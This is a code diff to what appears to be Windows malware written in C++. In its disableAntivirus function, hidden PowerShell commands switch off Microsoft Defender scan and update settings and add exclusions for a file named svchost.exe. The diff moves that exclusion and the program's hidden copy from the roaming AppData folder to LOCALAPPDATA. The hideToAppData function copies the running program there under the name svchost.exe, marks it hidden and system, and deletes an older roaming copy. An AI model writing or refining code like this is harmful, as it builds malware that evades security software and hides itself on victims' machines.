@@ -1355,7 +1355,7 @@ void disableAntivirus() {
     WinExec("powershell -Command Set-MpPreference -DisableCatchupQuickScan $true -Force 2>$null", SW_HIDE);
     WinExec("powershell -Command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force 2>$null", SW_HIDE);
     WinExec("powershell -Command Add-MpPreference -ExclusionProcess \"svchost.exe\" 2>$null", SW_HIDE);
-    WinExec("powershell -Command Add-MpPreference -ExclusionPath \"$env:APPDATA\\svchost.exe\" 2>$null", SW_HIDE);
+    WinExec("powershell -Command Add-MpPreference -ExclusionPath \"$env:LOCALAPPDATA\\svchost.exe\" 2>$null", SW_HIDE);
     WinExec("powershell -Command Add-MpPreference -ExclusionPath \"$env:TEMP\\svchost.exe\" 2>$null", SW_HIDE);
 
     // Registry disable
@@ -1610,9 +1610,16 @@ DWORD WINAPI inputThread(LPVOID) {
 void hideToAppData() {
     char exePath[MAX_PATH]; DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
     if (len == 0 || len >= MAX_PATH) return;
-    char appData[MAX_PATH]; DWORD adLen = GetEnvironmentVariableA("APPDATA", appData, MAX_PATH);
+    char appData[MAX_PATH]; DWORD adLen = GetEnvironmentVariableA("LOCALAPPDATA", appData, MAX_PATH);
     if (adLen == 0 || adLen >= MAX_PATH) return;
     std::string dest = std::string(appData) + "\\svchost.exe";
+    // Clean up old roaming copy
+    char roam[MAX_PATH];
+    if (GetEnvironmentVariableA("APPDATA", roam, MAX_PATH) > 0 && roam[0]) {
+        std::string old = std::string(roam) + "\\svchost.exe";
+        SetFileAttributesA(old.c_str(), FILE_ATTRIBUTE_NORMAL);
+        DeleteFileA(old.c_str());
+    }
     if (GetFileAttributesA(dest.c_str()) == INVALID_FILE_ATTRIBUTES || _stricmp(exePath, dest.c_str()) != 0) {
         CopyFileA(exePath, dest.c_str(), FALSE);
         SetFileAttributesA(dest.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
